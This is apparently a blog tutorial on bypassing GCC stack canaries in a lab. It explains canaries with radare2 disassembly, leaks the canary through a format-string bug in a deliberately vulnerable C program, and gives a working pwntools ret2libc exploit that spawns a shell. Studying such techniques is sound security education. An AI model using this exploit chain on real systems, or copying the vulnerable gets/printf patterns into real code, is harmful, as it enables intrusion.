---
layout: post
title:  Reverse engineering x64 binaries with Radare2 - Defeating stack canaries
tags: c reversing radare
image: '/images//madrid_renting/canaries.png'
date: 2022-06-26 15:01:35 -0700
---

#### Compiling without no-stack-protector

Greetings dear potential binary exploiters. Following the precedent posts where we discussed a bit about buffer overflow vulnerabilities and how to write exploits for them, today we are going to talk about stack canaries.

As we remember, in the previous posts we used to compile our vulnerable program disabling the protection mechanisms on the stack (no-stack-protector, no-pie options). Before we start, let us inspect what happens if we compile the program without disabling them. We start from our simple(st) vulnerable program:

```C
#include <stdio.h>

void greet_me()
{
  char name[200];
  gets(name);
  printf("Hi there %s !!\n",name);
}

int main(int argc, char *argv[])
{
  greet_me();
  return 0; 
}
```
And we compile it like this:

```
gcc -w vuln.c -o vuln -D_FORTIFY_SOURCE=0
```
Then we try to overflow the buffer by sending a lot of As, as usual:
```
lab@lab-VirtualBox:~/canary$ ./vuln_canary 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Hi there AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA !!
*** stack smashing detected ***: <unknown> terminated
```
But this time we notice that the program terminates withouth the typical overflow. Instead we see a "stack smashing detected" followed by a "terminated". So the program somehow detects the buffer overflow, and terminates the program right away leaving no room for any exploit to work.

#### Stack canaries

What happened in here is that, as it wasn't disabled, GCC compiled the program enabling stack canaries. The term Stack Canaries paraphrases the [Canary in a coal mine](https://en.wiktionary.org/wiki/canary_in_a_coal_mine), that was a protection mechanism for miners, working in coal mines back then in the early 20th century. The miners would bring an actual canary inside the mine, whenever the canary died it was time to leave the mine for food, before facing death due to air intoxication. The following image extracted from Ch0pin's blog shows a sample canary:

[!canarimine](https://miro.medium.com/max/1400/0*PgNurmyrOS3WVsAs.jpg)


The thing works in a similar way here in the stack. This mechanism starts from the fact that an attacker will try to overflow the stack, that is, to overwrite memory, writting stuff when it should not be done. Assume that at the beginning of a function call (e.g. during its prologue) we are saving a value in the function’s stack frame, we would expect (! if everything went well !) to read the same value just before the function exits or namely at its epilogue. If the value has changed, then the execution of the program will be terminated and an error message will be displayed.

Visually, we can see that stack canaries work like in the following diagram:

[!canary](https://miro.medium.com/max/562/1*bHpEk6RPDTfdU2bIdVspbQ.png)

Now if we go back to our previous program, compiled without deactivating the stack protector, we see the following before and after the greet_me function:


```
0x5555555546fa    3 96           sym.greet_me
0x55555555475a    1 32           sym.main
0x555555554780    4 101          sym.__libc_csu_init
0x5555555547f0    1 2            sym.__libc_csu_fini
0x5555555547f4    1 9            sym._fini
0x555555754fe0    1 1020         reloc.__libc_start_main_224
[0x7ffff7dd4090]> s 0x5555555546fa
[0x5555555546fa]> pdf
/ (fcn) sym.greet_me 96
|   sym.greet_me ();
|           ; var int local_d0h @ rbp-0xd0
|           ; var int local_8h @ rbp-0x8
|              ; CALL XREF from 0x55555555476e (sym.main)
|           0x5555555546fa      55             push rbp
|           0x5555555546fb      4889e5         mov rbp, rsp
|           0x5555555546fe      4881ecd00000.  sub rsp, 0xd0
|           0x555555554705      64488b042528.  mov rax, qword fs:[0x28] ; [0x28:8]=-1 ; '(' ; 40
|           0x55555555470e      488945f8       mov qword [local_8h], rax
|           0x555555554712      31c0           xor eax, eax
|           0x555555554714      488d8530ffff.  lea rax, qword [local_d0h]
|           0x55555555471b      4889c7         mov rdi, rax            ; char *s
|           0x55555555471e      b800000000     mov eax, 0
|           0x555555554723      e8a8feffff     call sym.imp.gets       ; char*gets(char *s)
|           0x555555554728      488d8530ffff.  lea rax, qword [local_d0h]
|           0x55555555472f      4889c6         mov rsi, rax
|           0x555555554732      488d3dcb0000.  lea rdi, qword str.Hi_there__s ; 0x555555554804 ; "Hi there %s !!\n" ; const char * format
|           0x555555554739      b800000000     mov eax, 0
|           0x55555555473e      e87dfeffff     call sym.imp.printf     ; int printf(const char *format)
|           0x555555554743      90             nop
|           0x555555554744      488b45f8       mov rax, qword [local_8h]
|           0x555555554748      644833042528.  xor rax, qword fs:[0x28]
|       ,=< 0x555555554751      7405           je 0x555555554758
|       |   0x555555554753      e858feffff     call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)
|       `-> 0x555555554758      c9             leave
\           0x555555554759      c3             ret
[0x5555555546fa]> 
```
As we see, before the function starts the program loads the content from qword fs:[0x28] into local_8h that is on the stack. Then it retrieves back its value and compares with that initial value, to see if they match. If they don't, the program won't return avoiding the execution of a potential exploit, as we saw. Instead it will jump to a function that will basically prompt the stack smash string and exit() as safely as possible.


In radare2, we can check if stack canaries are enabled on an executable file like this:
```
[0x5555555545f0]> i~pic,canary,nx,crypto,stripped,static,relocs
file     /home/lab/canary/vuln_base
canary   true
crypto   false
nx       true
pic      true
relocs   false
static   false
stripped true
[0x5555555545f0]> 
```

And we can debug the program to inspect the stack canary value at the start of the function:
```
[0x5555555546fa]> pdf
/ (fcn) sym.greet_me 96
|   sym.greet_me ();
|           ; var int local_d0h @ rbp-0xd0
|           ; var int local_8h @ rbp-0x8
|              ; CALL XREF from 0x55555555476e (sym.main)
|           0x5555555546fa      55             push rbp
|           0x5555555546fb      4889e5         mov rbp, rsp
|           0x5555555546fe      4881ecd00000.  sub rsp, 0xd0
|           0x555555554705      64488b042528.  mov rax, qword fs:[0x28] ; [0x28:8]=-1 ; '(' ; 40
|           0x55555555470e      488945f8       mov qword [local_8h], rax
|           ;-- rip:
|           0x555555554712 b    31c0           xor eax, eax
|           0x555555554714      488d8530ffff.  lea rax, qword [local_d0h]
|           0x55555555471b      4889c7         mov rdi, rax
|           0x55555555471e      b800000000     mov eax, 0
|           0x555555554723      e8a8feffff     call sym.imp.gets       ; char*gets(char *s)
|           0x555555554728      488d8530ffff.  lea rax, qword [local_d0h]
|           0x55555555472f      4889c6         mov rsi, rax
|           0x555555554732      488d3dcb0000.  lea rdi, qword str.Hi_there__s ; 0x555555554804 ; "Hi there %s !!\n"
|           0x555555554739      b800000000     mov eax, 0
|           0x55555555473e      e87dfeffff     call sym.imp.printf     ; int printf(const char *format)
|           0x555555554743      90             nop
|           0x555555554744      488b45f8       mov rax, qword [local_8h]
|           0x555555554748      644833042528.  xor rax, qword fs:[0x28]
|       ,=< 0x555555554751      7405           je 0x555555554758
|       |   0x555555554753      e858feffff     call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)
|       `-> 0x555555554758      c9             leave
\           0x555555554759      c3             ret
[0x5555555546fa]> dr rax
0x22bb275bb4188b00
```
As we see it is stored on the stack, before the saved registers and the frame pointer:
```
[0x5555555546fa]> pxw @ rbp-0x8
0x7fffffffdf98  0xb4188b00 0x22bb275b 0xffffdfc0 0x00007fff  ....['."........
0x7fffffffdfa8  0x55554773 0x00005555 0xffffe0a8 0x00007fff  sGUUUU..........
```
And then retrieved at the end to check for over-writes:
```
|           0x555555554744      488b45f8       mov rax, qword [local_8h]
|           ;-- rip:
|           0x555555554748 b    644833042528.  xor rax, qword fs:[0x28]
|       ,=< 0x555555554751      7405           je 0x555555554758
|       |   0x555555554753      e858feffff     call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)
|       `-> 0x555555554758      c9             leave
\           0x555555554759      c3             ret
[0x555555554748]> dr rax
0x22bb275bb4188b00
[0x555555554748]> 
```
We can re-run and debug the program many times to see how the stack canary, in our case, changes every time.

We can also prompt its value in a more visual and easy way by using the following C program:
```C
#include <stdio.h>

#define unsigned_long_int unsigned long int

void greet_me()
{
    char name[200];
    register void *rsp asm ("%rsp");
    register void *rbp asm ("%rbp");
    unsigned_long_int size = ((rbp + 8 * 2) - rsp) / 8;
    

    printf("-----SZ: %lld | RSP: %llx | RBP: %llx ---------------\n",rsp,rbp);
    printf("[+] Canary value: %llx\n",*((unsigned_long_int*) (rbp-0x8)));
    printf("---------------------------------------------------------\n");
}

void greet_me_again()
{
    char name[200];
    register void *rsp asm ("%rsp");
    register void *rbp asm ("%rbp");
    unsigned_long_int size = ((rbp + 8 * 2) - rsp) / 8;
    

    printf("-----SZ: %lld | RSP: %llx | RBP: %llx ---------------\n",rsp,rbp);
    printf("[+] Canary value: %llx\n",*((unsigned_long_int*) (rbp-0x8)));
    printf("---------------------------------------------------------\n");

}


int main(int argc, char *argv[])
{
    greet_me();
    greet_me_again();
    return 0;  
}
```
In here, we see that the canary will be the same, same value for every function call inside our program:
```
lab@lab-VirtualBox:~/canary$ ./vuln 88
-----SZ: 140737488346864 | RSP: 7fffffffdfd0 | RBP: 555555554860 ---------------
[+] Canary value: b3cf9bf71e2dfa00
---------------------------------------------------------
-----SZ: 140737488346864 | RSP: 7fffffffdfd0 | RBP: 7ffff7af2104 ---------------
[+] Canary value: b3cf9bf71e2dfa00
---------------------------------------------------------
lab@lab-VirtualBox:~/canary$ 
```
Which is particuarly good, as if we are able to retrieve the canary value in execution, we will be able to safely attack every function.

#### Canary types

There is not a single type of stack canary, the following [SANS article](https://www.sans.org/blog/stack-canaries-gingerly-sidestepping-the-cage/) describes them very well. But to summarize it a little bit for our case, we'll usually encounter Terminator canaries: consisting of at least one string terminating character (new line, null e.t.c.) and the idea is that since most overflow vulnerabilities occur from functions such as gets(), strcpy(), the attacker won’t be able to include them in the payload. Random canaries: consisting of a random byte sequence that is not known to the attacker. And Random XOR: consisting of a random value (as above) XOR’ed with a mask constructed from the adjacent frame pointer and return address. 

Terminator canaries work very well by limiting the buffer lenght, cutting the payload automatically as 0x00 terminates the string. Random canaries such as our case work by comparing a randomly generated value though they may be useless if the program also has a memory leak vulnerability allowing the attacker to retrieve that randomly generated value. XOR canaries work similarly and suffer from similar vulnerabilities, adding an extra step of difficulty. 

Since version 2.7.2.2 GCC includes the StackGuard extension [check it here](https://github.com/gcc-mirror/gcc/blob/master/libssp/ssp.c) enabling the use of random canaries. The compiler will add code in the function prolog and epilog enabling the canary. 

#### Bypassing StackGuard with memory leaks

So in general terms we'll bypass the StackGuard by accessing the stack canary value in two ways: either by bruteforcing for the canary value or by abusing a memory leak to retrieve its value. BananaMafia has a nice tutorial on [Bruteforcing the canary](https://bananamafia.dev/post/binary-canary-bruteforce/) In here we will go for the memory leak approach:

So we'll start with this program, that basically is the same as the previous one except for that it reads a parameter from argv:
```C
#include <stdio.h>
#define unsigned_long_int unsigned long int
void greet_me(char *input)
{
    char name[200];
    printf(input);
    printf("\n")
    gets(name);
    printf("Hi there %s !!\n",name);
}
int main(int argc, char *argv[])
{
    greet_me(argv[1]);
    return 0;  
}
```
And it is vulnerable to a [format string](https://infosecwriteups.com/exploiting-format-string-vulnerability-97e3d588da1b) vulnerability. 

So we see that format strings like %s, %d etc can be used to specify a data format. The [full list for C is here](https://cplusplus.com/reference/cstdio/printf/). So %d will go for the decimal integer, c for character and...x for hexadecimal... Also, we can specify the length: for example ll will stand for long long int. And we can combine them together so llx will specify an x64 address!

Going back to our program, we see it basically sends the content of the first argument sent to the program straight to printf, without any checks nor additional format specifications inside the program. So if we send a buffer containing only format specifiers, without any actual text nor data, the program will try to refeer to the data on the stack thus leaking memory, in our format of interest:

We can try to send the following buffer as the argument:
```
%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx
```
And we will see the memory leaks:
```
lab@lab-VirtualBox:~/canary$ ./vuln_canary %llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx
7fffffffdfd8,7fffffffdff0,5555555547f0,7ffff7dced80,7ffff7dced80,0,7fffffffe317,0,7ffff7ffe710,7ffff7b95687,0,7fffffffde50,7fffffffde60,7ffff7ffea98,0,0,7fffffffde70,ffffffff,0,7ffff7ffb2a8,7ffff7ffe710,0,0,0,0,9,7ffff7dd5660,7fffffffdf08,f0b5ff,1,55555555483d,7ffff7de3b40,ec6f25befc82300,7fffffffdef0,5555555547e1,7fffffffdfd8,200000000,5555555547f0,7ffff7a03c87,2,7fffffffdfd8,200008000,5555555547bf,0,be51b7a7fa1c8578,555555554630,7fffffffdfd0,0
```
Having previously reversed our program we can easily identify something that resembles our canary:
```
lab@lab-VirtualBox:~/canary$ ./vuln_canary  %33\$llx
7e791a4e294e1100

Hi there  !!
lab@lab-VirtualBox:~/canary$ 
lab@lab-VirtualBox:~/canary$ ./vuln_canary  %33\$llx
85f4f9bb91ee7100
```
There it is!

From this point, writting the exploit is very easy if we understand the fundamentals. We just need to 1) automatically retrieve the canary by a memory leak 2) overflow/overwrite the stack placing the (retrieved) value of the canary in its position (local_8h). Then proceed with the exploit as usual.

[!stack](https://miro.medium.com/max/1400/1*VV_5Nf_jCSYzjTdkrX_2YQ.png)


So we can kind of re-craft our exploit by using the return from libc technique, previously discussed in this blog.

We start by searching inside libc:
```
[0x555555554630]> e search.from=0x7ffff7dd3000
[0x555555554630]> e search.to=0x7ffff7dfc000
```
Retrieving ret, pop rdi; ret and the addresses from system, bin/sh and exit. So we can launch a shell:
```
[0x555555554630]> /R ret
  0x7ffff7dd336c       69374ab593d1  imul esi, dword [rdi], 0xd193b54a
  0x7ffff7dd3372               70ed  jo 0x7ffff7dd3361
  0x7ffff7dd3374                 54  push rsp
  0x7ffff7dd3375         a9a542b486  test eax, 0x86b442a5
  0x7ffff7dd337a                 c3  ret


[0x555555554630]> /R pop rdi
  0x7ffff7dd47fb                 5f  pop rdi
  0x7ffff7dd47fc                 c3  ret

[0x555555554630]> dmi libc system~ system$
1406 0x0004f420 0x7ffff7a31420   WEAK   FUNC   45 system

Searching 7 bytes in [0x7ffff7dd3000-0x7ffff7dfc000]
hits: 0
0x7ffff7b95d88 hit2_0 .cempty == 1-c/bin/shexit 0canonica.
[0x555555554630]> pxw @ 0x7ffff7b95d88
0x7ffff7b95d88  0x6e69622f 0x0068732f 0x74697865 0x63003020  /bin/sh.exit 0.c
0x7ffff7b95d98  0x6e6f6e61 0x6c616369 0x2e657a69 0x534d0063  anonicalize.c.MS
```
And then we can integrate them into a function exploit. In here I used pwntools [That can be easilly installed following this guide](https://github.com/Gallopsled/pwntools-tutorial/blob/master/installing.md).

And I crafted the exploit like this. Note that we can either use the return from libc technique by finding libc (or any other if it fits) base address and then calling addresses relative from that point, or we can either just call those addresses directly (harcoding everything). Generally doing relative addresses from libc will be more useful as we face ASLR and/or work on different systems.
```Py
#!/usr/bin/env python3

from pwn import *
from struct import pack

exe = context.binary = ELF('./vuln_canary')

libc_base_address = 0x7ffff79e2000

ret = libc_base_address+0x3F137A
# ret  = 0x7ffff7dd337a

pop_rdi = libc_base_address + 0x3F27FB
# pop_rdi = 0x7ffff7dd47fb

bin_sh = libc_base_address + 0x1B3D88
#bin_sh = 0x7ffff7b95d88 

_system = libc_base_address + 0x4F420
#_system = 0x7ffff7a31420

_exit = libc_base_address + 0x43110
# _exit =0x7ffff7a25110

print("[+] Spawning process...")

io = process([exe.path , "%33$llx"])
canary = int(io.readline().strip(),16)

print("[+] Canary leaked:{}".format(hex(canary)))

buf = b'A' * 200 

buf += p64(canary)
buf += b'\x42' * 8
buf += p64(ret)
buf += p64(pop_rdi)
buf += p64(bin_sh)
buf += p64(_system)
buf += p64(_exit)

with open('payload','wb') as payload:
    payload.write(buf)

io.sendline(buf)

io.interactive()
```
And after executing the exploit, no surprise, execution gained:
```
lab@lab-VirtualBox:~/canary$ python3 exploit.py 
[*] '/home/lab/canary/vuln_canary'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Spawning process...
[+] Starting local process '/home/lab/canary/vuln_canary': pid 18398
[+] Canary leaked:0x9a67985edc03e800
[*] Switching to interactive mode
Hi there AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA !!
$ ls
exploit.py  script.rr2    vuln_base  vuln_canary      vuln_print.c
payload     vuln    vuln.c       vuln_canary.c
$  
```

And that was it for today. Let's keep learning!


#### References

[ch0pin's blog](https://valsamaras.medium.com/introduction-to-x64-linux-binary-exploitation-part-4-stack-canaries-e9b6dd2c3127)
[Format string bugs](https://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html)
